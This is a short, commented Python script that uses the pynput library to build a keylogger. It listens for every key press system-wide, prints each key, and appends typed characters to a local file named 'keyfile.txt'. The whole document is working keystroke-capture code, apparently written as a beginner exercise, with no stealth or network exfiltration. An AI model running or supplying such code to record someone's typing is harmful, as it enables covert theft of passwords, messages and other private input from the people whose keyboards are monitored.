#pynput's library, imports keyboard module
#to capture key events from user
from pynput import keyboard # type: ignore

#onPressed auto passes key
def keyPressed(key):
    print(str(key))
    #open up file, append to file
    with open("keyfile.txt", 'a') as logKey:
        #handle exception, print error msg
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


#if the main method's ready to fire
if __name__ == "__main__":
    #listener is an object we create
    #parameter, whenever keyispressed pass info to function
    listener = keyboard.Listener(on_press=keyPressed)
    #use object
    listener.start()
    #we're ready for people to start asking for strings
    input()

